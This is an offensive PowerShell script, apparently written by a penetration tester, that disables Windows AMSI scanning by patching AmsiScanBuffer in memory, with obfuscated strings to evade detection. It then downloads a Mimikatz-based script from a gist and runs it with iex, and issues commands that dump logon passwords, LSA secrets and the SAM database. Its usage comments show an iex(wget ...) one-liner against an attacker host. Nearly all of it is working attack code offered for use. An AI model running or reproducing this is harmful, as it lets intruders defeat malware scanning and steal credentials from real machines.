# functions
function GetAddress($m, $f) {
    $sA = [System.AppDomain]::CurrentDomain.GetAssemblies() | Where-Object {$_.GlobalAssemblyCache -and $_.Location.Split('\\')[-1] -eq 'Sy' + 'ste' + 'm.dll'}

    $uNM = ForEach ($t in $sA.GetTypes()) {
        $t | Where-Object {$_.FullName -like '*Nati' + 'veM' + 'ethods' -and $_.Fullname -like '*Win32*' -and $_.Fullname -like '*Un*'}
    }

    $mH = $uNM.GetMethods() | Where-Object {$_.Name -like '*Handle' -and $_.Name -like '*Module*'} | Select-Object -First 1
    $pA = $uNM.GetMethod('Ge' + 'tPro' + 'cAdd' + 'ress', [type[]]('IntPtr', 'System.String'))

    $m = $mH.Invoke($null, @($m))
    $pA.Invoke($null, @($m, $f))
}

function GetType($f, $dT = [Void]) {
    $t = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
    [System.MulticastDelegate])

    $t.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $f).SetImplementationFlags('Runtime, Managed')
    $t.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $dT, $f).SetImplementationFlags('Runtime, Managed')

    return $t.CreateType()
}

# main
$aDll = "a" + "ms" + "i" + "." + "dll"
$sB = $aDll.Substring(0, 1).ToUpper() + $aDll.Substring(1, 3) + "Sc" + "an" + "Bu" + "ff" + "er"
$aSB = GetAddress $aDll $sB

$vp = [System.Runtime.InteropServices.Marshal]::("{2}{3}{5}{4}{1}{0}" -f 'Pointer','nction','GetDelega','teFo','u','rF').Invoke((GetAddress ("kern" + "el3" + "2.dl" + "l") ("Vi" + "rtu" + "alPr" + "ote" + "ct")), (GetType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Boolean])))

$p = 0
$vp.Invoke($aSB, [uint32]5, 0x40, [Ref] $p) | Out-Null
$pb = [Byte[]] (184, 87, 0, 7, 128, 195)
$s = "[System."
$s += "Runti" + "me"
$s += ".Inte" + "ropSer" + "vices"
$s += ".Mars" + "hal]"
$s += "::"
$s += "Copy"

$i = Invoke-Expression ($s + "(`$pb, 0, `$aSB, 6)")
# TLDR:
# iex(wget https://gist.github.com/pich4ya/e93abe76d97bd1cf67bfba8dce9c0093/raw/e32760420ae642123599b6c9c2fddde2ecaf7a2b/Invoke-OneShot-Mimikatz.ps1 -UseBasicParsing)
#
# @author Pichaya Morimoto (p.morimoto@sth.sh)
# One Shot for M1m1katz PowerShell Dump All Creds with AMSI Bypass 2022 Edition
# (Tested and worked on Windows 10 x64 patched 2022-03-26)
#
# Usage:
# 1. You need a local admin user's powershell with Medium Mandatory Level (whoami /all)
# 2. iex(wget https://attacker-local-ip/Invoke-OneShot-Mimikatz.ps1 -UseBasicParsing)
# 3. You will get creds
#
# AMSI Bypass is copied from payatu's AMSI-Bypass (23-August-2021)
# https://payatu.com/blog/arun.nair/amsi-bypass
$code = @"
using System;
using System.Runtime.InteropServices;
public class WinApi {
	
	[DllImport("kernel32")]
	public static extern IntPtr LoadLibrary(string name);
	
	[DllImport("kernel32")]
	public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
	
	[DllImport("kernel32")]
	public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out int lpflOldProtect);
	
}
"@

Add-Type $code

$amsiDll = [WinApi]::LoadLibrary("amsi.dll")
$asbAddr = [WinApi]::GetProcAddress($amsiDll, "Ams"+"iScan"+"Buf"+"fer")
$ret = [Byte[]] ( 0xc3, 0x80, 0x07, 0x00,0x57, 0xb8 )
$out = 0

[WinApi]::VirtualProtect($asbAddr, [uint32]$ret.Length, 0x40, [ref] $out)
[System.Runtime.InteropServices.Marshal]::Copy($ret, 0, $asbAddr, $ret.Length)
[WinApi]::VirtualProtect($asbAddr, [uint32]$ret.Length, $out, [ref] $null)


# nishang - 2.2.0 (Jul 24, 2021)
# Change this to "attacker-local-ip" for internal sources
wget('https://gist.githubusercontent.com/pich4ya/144d32262861b573279d15e653c4e08d/raw/6f019c4e2f1f62ffc0754d01dff745d3cec62057/Invoke-SoHighSoHigh.ps1') -UseBasicParsing|iex
# Double single quote here is by intention.
Invoke-SoHighSoHigh -Command '"privilege::debug" "token::elevate" "sekurlsa::logonPasswords full" "lsadump::secrets" "lsadump::sam"'
